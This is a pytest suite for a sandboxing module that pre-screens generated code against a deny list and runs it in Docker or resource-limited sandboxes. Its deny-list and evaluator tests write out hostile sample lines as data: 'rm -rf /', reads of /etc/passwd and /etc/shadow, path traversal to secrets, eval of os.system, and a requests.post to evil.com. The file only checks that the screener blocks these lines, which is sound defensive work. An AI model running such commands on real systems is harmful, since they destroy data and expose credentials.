"""Tests for sandbox.py: ContentPreScreener, sandboxes, and SandboxFactory."""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from core_orchestrator.sandbox import (
    ContentPreScreener,
    DockerSandbox,
    NetworkPolicy,
    ResourceLimitSandbox,
    SandboxFactory,
    SandboxSpec,
    ScreenResult,
)


# ===========================================================================
# ContentPreScreener — unit tests
# ===========================================================================

class TestScreenResult:
    def test_truthy_when_allowed(self):
        assert bool(ScreenResult(allowed=True)) is True

    def test_falsy_when_blocked(self):
        assert bool(ScreenResult(allowed=False, reason="bad")) is False

    def test_reason_stored(self):
        r = ScreenResult(allowed=False, reason="danger")
        assert r.reason == "danger"


class TestContentPreScreenerDangerousPatterns:
    """Each entry verifies one deny-list pattern is caught."""

    @pytest.mark.parametrize("code,desc", [
        # subprocess
        ("import subprocess\nsubprocess.run(['ls'])", "subprocess import"),
        ("subprocess.Popen(['bash'])", "subprocess.Popen"),
        ("from subprocess import run", "from subprocess import"),
        # os execution
        ("os.system('rm -rf /')", "os.system"),
        ("os.popen('cat /etc/passwd')", "os.popen"),
        ("os.execvp('bash', ['bash'])", "os.execvp"),
        ("os.spawnl(os.P_WAIT, 'sh', 'sh')", "os.spawnl"),
        # network
        ("urllib.request.urlopen('http://evil.com')", "urllib.request.urlopen"),
        ("import urllib.request", "import urllib.request"),
        ("from urllib.request import urlopen", "from urllib.request"),
        ("requests.get('http://evil.com')", "requests.get"),
        ("requests.post('http://evil.com', data=x)", "requests.post"),
        ("import requests", "import requests"),
        ("import httpx", "import httpx"),
        ("from httpx import get", "from httpx"),
        ("socket.socket(socket.AF_INET, socket.SOCK_STREAM)", "socket.socket"),
        ("import socket", "import socket"),
        ("from socket import socket", "from socket"),
        # code injection
        ("eval('__import__(\"os\").system(\"id\")')", "eval"),
        ("exec('import os; os.system(\"id\")')", "exec"),
        ("__import__('os').system('id')", "__import__"),
        ("importlib.import_module('os')", "importlib"),
        # filesystem traversal / sensitive paths
        ("open('/etc/passwd')", "open /etc/"),
        ("open('/etc/shadow', 'r')", "open /etc/ shadow"),
        ("open('/app/secrets')", "open /app/"),
        ("open('../../../etc/passwd')", "open path traversal"),
        ('open("../secret.key")', "open path traversal double-quote"),
    ])
    def test_dangerous_code_blocked(self, code: str, desc: str):
        result = ContentPreScreener.check(code)
        assert not result.allowed, f"Expected BLOCK for: {desc!r}\nCode: {code!r}"
        assert result.reason != ""

    def test_reason_describes_pattern(self):
        result = ContentPreScreener.check("os.system('id')")
        assert "os.system" in result.reason

    def test_subprocess_in_comment_still_blocked(self):
        # We accept false positives for strings containing the pattern
        code = "# using subprocess\nimport subprocess"
        result = ContentPreScreener.check(code)
        assert not result.allowed


class TestContentPreScreenerSafePatterns:
    """Legitimate code must NOT be blocked."""

    @pytest.mark.parametrize("code,desc", [
        ("print('hello world')", "simple print"),
        ("x = 1 + 2\nprint(x)", "arithmetic"),
        ("def greet(name):\n    return f'Hello {name}'\nprint(greet('World'))", "function def"),
        ("import os\nprint(os.getcwd())", "os.getcwd is allowed"),
        ("import os\nprint(os.path.join('a', 'b'))", "os.path.join"),
        ("from pathlib import Path\np = Path('.')", "pathlib"),
        ("import json\ndata = json.loads('{\"k\": 1}')", "json module"),
        ("import re\nre.match(r'\\d+', '123')", "re module"),
        ("with open('output.txt', 'w') as f:\n    f.write('hello')", "open relative path"),
        ("from urllib.parse import urlencode", "urllib.parse is allowed"),
        ("import math\nprint(math.pi)", "math"),
        ("class Foo:\n    def bar(self): pass", "class definition"),
        ("raise ValueError('test')", "raise exception"),
        (
            "<!DOCTYPE html><html><head></head><body></body></html>",
            "HTML content",
        ),
    ])
    def test_safe_code_allowed(self, code: str, desc: str):
        result = ContentPreScreener.check(code)
        assert result.allowed, f"Expected ALLOW for: {desc!r}\nCode: {code!r}\nReason: {result.reason}"


class TestContentPreScreenerCheckFile:
    def test_safe_file_allowed(self, tmp_path):
        f = tmp_path / "safe.py"
        f.write_text("print('hello')\n", encoding="utf-8")
        result = ContentPreScreener.check_file(f)
        assert result.allowed

    def test_dangerous_file_blocked(self, tmp_path):
        f = tmp_path / "bad.py"
        f.write_text("import subprocess\nsubprocess.run(['ls'])\n", encoding="utf-8")
        result = ContentPreScreener.check_file(f)
        assert not result.allowed
        assert "subprocess" in result.reason

    def test_missing_file_blocked(self, tmp_path):
        result = ContentPreScreener.check_file(tmp_path / "nonexistent.py")
        assert not result.allowed
        assert "Cannot read" in result.reason


# ===========================================================================
# SandboxSpec
# ===========================================================================

class TestSandboxSpec:
    def test_defaults(self):
        spec = SandboxSpec()
        assert spec.memory_mb == 512
        assert spec.cpu_time_s == 25
        assert spec.network == NetworkPolicy.NONE

    def test_custom_values(self):
        spec = SandboxSpec(memory_mb=256, cpu_time_s=10, network=NetworkPolicy.ALL)
        assert spec.memory_mb == 256
        assert spec.cpu_time_s == 10
        assert spec.network == NetworkPolicy.ALL


# ===========================================================================
# ResourceLimitSandbox
# ===========================================================================

class TestResourceLimitSandbox:
    def test_successful_command(self, tmp_path):
        sb = ResourceLimitSandbox()
        result = sb.run(
            [sys.executable, "-c", "print('resource_sandbox_ok')"],
            cwd=tmp_path,
            timeout=10,
        )
        assert result.success
        assert "resource_sandbox_ok" in result.stdout
        assert result.sandbox_mode == "resource_limit"

    def test_failing_command(self, tmp_path):
        sb = ResourceLimitSandbox()
        result = sb.run(
            [sys.executable, "-c", "raise SystemExit(1)"],
            cwd=tmp_path,
            timeout=10,
        )
        assert not result.success
        assert result.return_code == 1

    def test_nonzero_exit(self, tmp_path):
        sb = ResourceLimitSandbox()
        result = sb.run(
            [sys.executable, "-c", "import sys; sys.exit(42)"],
            cwd=tmp_path,
            timeout=10,
        )
        assert not result.success
        assert result.return_code == 42

    def test_timeout(self, tmp_path):
        sb = ResourceLimitSandbox()
        result = sb.run(
            [sys.executable, "-c", "import time; time.sleep(60)"],
            cwd=tmp_path,
            timeout=1,
        )
        assert not result.success
        assert result.timed_out

    def test_command_not_found(self, tmp_path):
        sb = ResourceLimitSandbox()
        result = sb.run(
            ["definitely_not_a_real_binary_xyz"],
            cwd=tmp_path,
            timeout=5,
        )
        assert not result.success
        assert result.return_code == -1

    def test_to_dict(self, tmp_path):
        sb = ResourceLimitSandbox()
        result = sb.run(
            [sys.executable, "-c", "print('ok')"],
            cwd=tmp_path,
            timeout=10,
        )
        d = result.to_dict()
        assert "sandbox_mode" in d
        assert d["sandbox_mode"] == "resource_limit"


# ===========================================================================
# DockerSandbox
# ===========================================================================

class TestDockerSandboxIsAvailable:
    def test_returns_false_when_docker_not_found(self):
        DockerSandbox._reset_cache()
        with patch("subprocess.run", side_effect=FileNotFoundError):
            assert DockerSandbox.is_available() is False
        DockerSandbox._reset_cache()

    def test_returns_false_when_docker_fails(self):
        DockerSandbox._reset_cache()
        mock_result = MagicMock()
        mock_result.returncode = 1
        with patch("subprocess.run", return_value=mock_result):
            assert DockerSandbox.is_available() is False
        DockerSandbox._reset_cache()

    def test_returns_true_when_docker_ok(self):
        DockerSandbox._reset_cache()
        mock_result = MagicMock()
        mock_result.returncode = 0
        with patch("subprocess.run", return_value=mock_result):
            assert DockerSandbox.is_available() is True
        DockerSandbox._reset_cache()

    def test_result_is_cached(self):
        DockerSandbox._reset_cache()
        mock_result = MagicMock()
        mock_result.returncode = 0
        with patch("subprocess.run", return_value=mock_result) as mock_run:
            DockerSandbox.is_available()
            DockerSandbox.is_available()
            # subprocess.run called only once (for docker info)
            assert mock_run.call_count == 1
        DockerSandbox._reset_cache()


class TestDockerSandboxPathRemap:
    """Test the path-remapping logic without actually running Docker."""

    def test_remap_python_executable(self, tmp_path):
        sb = DockerSandbox()
        remapped = sb._remap_cmd([sys.executable, "-c", "print('hi')"], tmp_path)
        assert remapped[0] == "python3"
        assert remapped[1] == "-c"

    def test_remap_workspace_path(self, tmp_path):
        sb = DockerSandbox()
        script = str(tmp_path / "deliverables" / "app.py")
        remapped = sb._remap_cmd([sys.executable, script], tmp_path)
        assert remapped[0] == "python3"
        assert remapped[1] == "/workspace/deliverables/app.py"

    def test_no_remap_other_args(self, tmp_path):
        sb = DockerSandbox()
        remapped = sb._remap_cmd(["-m", "py_compile", "/other/path.py"], tmp_path)
        assert remapped == ["-m", "py_compile", "/other/path.py"]


class TestDockerSandboxRun:
    """Test DockerSandbox.run() by mocking subprocess.run."""

    def _make_proc(self, returncode=0, stdout="ok\n", stderr=""):
        m = MagicMock()
        m.returncode = returncode
        m.stdout = stdout
        m.stderr = stderr
        return m

    def test_successful_run(self, tmp_path):
        sb = DockerSandbox()
        with patch("subprocess.run", return_value=self._make_proc()) as mock_run:
            result = sb.run([sys.executable, "-c", "print('ok')"], tmp_path, timeout=10)
        assert result.success
        assert result.sandbox_mode == "docker"
        # Verify docker flags are present
        call_args = mock_run.call_args[0][0]
        assert "docker" in call_args
        assert "--network" in call_args
        assert "none" in call_args
        assert "--read-only" in call_args

    def test_failing_run(self, tmp_path):
        sb = DockerSandbox()
        with patch("subprocess.run", return_value=self._make_proc(returncode=1, stderr="error")):
            result = sb.run([sys.executable, "-c", "exit(1)"], tmp_path, timeout=10)
        assert not result.success
        assert result.return_code == 1

    def test_timeout(self, tmp_path):
        import subprocess as _subprocess
        sb = DockerSandbox()
        with patch("subprocess.run", side_effect=_subprocess.TimeoutExpired(cmd=[], timeout=10)):
            result = sb.run([sys.executable, "-c", "..."], tmp_path, timeout=10)
        assert not result.success
        assert result.timed_out

    def test_docker_not_found(self, tmp_path):
        sb = DockerSandbox()
        with patch("subprocess.run", side_effect=FileNotFoundError):
            result = sb.run([sys.executable, "-c", "..."], tmp_path, timeout=10)
        assert not result.success
        assert "not found" in result.stderr.lower()

    def test_memory_flag_in_command(self, tmp_path):
        spec = SandboxSpec(memory_mb=256)
        sb = DockerSandbox(spec=spec)
        with patch("subprocess.run", return_value=self._make_proc()) as mock_run:
            sb.run([sys.executable, "-c", "print('ok')"], tmp_path, timeout=10)
        call_args = mock_run.call_args[0][0]
        assert "--memory=256m" in call_args

    def test_volume_mount_in_command(self, tmp_path):
        sb = DockerSandbox()
        with patch("subprocess.run", return_value=self._make_proc()) as mock_run:
            sb.run([sys.executable, "-c", "print('ok')"], tmp_path, timeout=10)
        call_args = mock_run.call_args[0][0]
        assert "--volume" in call_args
        volume_idx = call_args.index("--volume")
        volume_value = call_args[volume_idx + 1]
        assert str(tmp_path) in volume_value
        assert "/workspace" in volume_value


# ===========================================================================
# SandboxFactory
# ===========================================================================

class TestSandboxFactory:
    def setup_method(self):
        DockerSandbox._reset_cache()

    def teardown_method(self):
        DockerSandbox._reset_cache()

    def test_returns_docker_when_available(self, monkeypatch):
        monkeypatch.delenv("HARNESS_SANDBOX_MODE", raising=False)
        mock_result = MagicMock()
        mock_result.returncode = 0
        with patch("subprocess.run", return_value=mock_result):
            sandbox = SandboxFactory.create()
        assert isinstance(sandbox, DockerSandbox)

    def test_returns_resource_limit_when_docker_unavailable(self, monkeypatch):
        monkeypatch.delenv("HARNESS_SANDBOX_MODE", raising=False)
        with patch("subprocess.run", side_effect=FileNotFoundError):
            sandbox = SandboxFactory.create()
        assert isinstance(sandbox, ResourceLimitSandbox)

    def test_env_var_force_docker(self, monkeypatch):
        monkeypatch.setenv("HARNESS_SANDBOX_MODE", "docker")
        sandbox = SandboxFactory.create()
        assert isinstance(sandbox, DockerSandbox)

    def test_env_var_force_resource(self, monkeypatch):
        monkeypatch.setenv("HARNESS_SANDBOX_MODE", "resource")
        sandbox = SandboxFactory.create()
        assert isinstance(sandbox, ResourceLimitSandbox)

    def test_env_var_auto_falls_back(self, monkeypatch):
        monkeypatch.setenv("HARNESS_SANDBOX_MODE", "auto")
        with patch("subprocess.run", side_effect=FileNotFoundError):
            sandbox = SandboxFactory.create()
        assert isinstance(sandbox, ResourceLimitSandbox)

    def test_custom_spec_propagated(self, monkeypatch):
        monkeypatch.setenv("HARNESS_SANDBOX_MODE", "resource")
        spec = SandboxSpec(memory_mb=128, cpu_time_s=5)
        sandbox = SandboxFactory.create(spec=spec)
        assert isinstance(sandbox, ResourceLimitSandbox)
        assert sandbox._spec.memory_mb == 128


# ===========================================================================
# Evaluator integration: pre-screening + sandboxed run_python
# ===========================================================================

class TestEvaluatorWithPreScreening:
    """Integration tests using the real Evaluator + sandbox (resource_limit mode)."""

    @pytest.fixture(autouse=True)
    def force_resource_sandbox(self, monkeypatch):
        monkeypatch.setenv("HARNESS_SANDBOX_MODE", "resource")

    @pytest.fixture
    def workspace(self, tmp_path):
        from core_orchestrator.workspace_manager import WorkspaceManager
        wm = WorkspaceManager(tmp_path)
        wm.create("proj")
        return wm

    @pytest.fixture
    def evaluator(self, workspace):
        from core_orchestrator.evaluator import Evaluator
        return Evaluator(workspace=workspace, workspace_id="proj", timeout=10)

    # --- Pre-screening via run_python ---

    def test_run_python_blocks_subprocess_import(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/mal.py",
            "import subprocess\nsubprocess.run(['echo', 'hi'])\n",
        )
        result = evaluator.run_python("deliverables/mal.py")
        assert not result.success
        assert result.blocked
        assert "subprocess" in result.blocked_reason

    def test_run_python_blocks_os_system(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/mal.py",
            "import os\nos.system('id')\n",
        )
        result = evaluator.run_python("deliverables/mal.py")
        assert not result.success
        assert result.blocked

    def test_run_python_blocks_network_call(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/net.py",
            "import urllib.request\nurllib.request.urlopen('http://evil.com')\n",
        )
        result = evaluator.run_python("deliverables/net.py")
        assert not result.success
        assert result.blocked

    def test_run_python_blocks_eval(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/eval_code.py",
            "eval('1+1')\n",
        )
        result = evaluator.run_python("deliverables/eval_code.py")
        assert not result.success
        assert result.blocked

    def test_run_python_blocks_sensitive_path_open(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/leak.py",
            "open('/etc/passwd').read()\n",
        )
        result = evaluator.run_python("deliverables/leak.py")
        assert not result.success
        assert result.blocked

    def test_run_python_blocks_path_traversal(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/traversal.py",
            "open('../../../secret').read()\n",
        )
        result = evaluator.run_python("deliverables/traversal.py")
        assert not result.success
        assert result.blocked

    # --- Legitimate code passes pre-screening and executes ---

    def test_run_python_executes_safe_script(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/hello.py",
            "print('hello sandbox')\n",
        )
        result = evaluator.run_python("deliverables/hello.py")
        assert result.success
        assert "hello sandbox" in result.stdout
        assert not result.blocked

    def test_run_python_captures_stderr_on_runtime_error(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/boom.py",
            "raise ValueError('expected error')\n",
        )
        result = evaluator.run_python("deliverables/boom.py")
        assert not result.success
        assert "expected error" in result.stderr
        assert not result.blocked

    def test_run_python_missing_file(self, evaluator):
        from core_orchestrator.evaluator import Evaluator
        result = evaluator.run_python("deliverables/nonexistent.py")
        assert not result.success
        assert "not found" in result.stderr

    def test_sandbox_mode_in_result(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/ok.py",
            "x = 1\n",
        )
        result = evaluator.run_python("deliverables/ok.py")
        assert result.sandbox_mode == "resource_limit"

    # --- run_eval pre-screening ---

    def test_run_eval_blocks_malicious_python(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/bad.py",
            "import subprocess\nsubprocess.run(['ls'])\n",
        )
        result = evaluator.run_eval(["bad.py"])
        assert not result.success
        assert result.blocked
        assert "subprocess" in result.blocked_reason

    def test_run_eval_passes_safe_python(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/safe.py",
            "x = 42\n",
        )
        result = evaluator.run_eval(["safe.py"])
        assert result.success

    def test_run_eval_still_catches_syntax_errors(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/syntax_err.py",
            "def foo(\n",
        )
        result = evaluator.run_eval(["syntax_err.py"])
        assert not result.success

    # --- EvalResult fields ---

    def test_blocked_result_to_dict(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/mal.py",
            "eval('1')\n",
        )
        result = evaluator.run_python("deliverables/mal.py")
        d = result.to_dict()
        assert d["blocked"] is True
        assert d["blocked_reason"] != ""
        assert "eval" in d["blocked_reason"]

    def test_error_summary_includes_blocked_reason(self, workspace, evaluator):
        workspace.write(
            "proj", "deliverables/mal.py",
            "import socket\n",
        )
        result = evaluator.run_python("deliverables/mal.py")
        summary = result.error_summary()
        assert "BLOCKED" in summary
        assert "socket" in summary
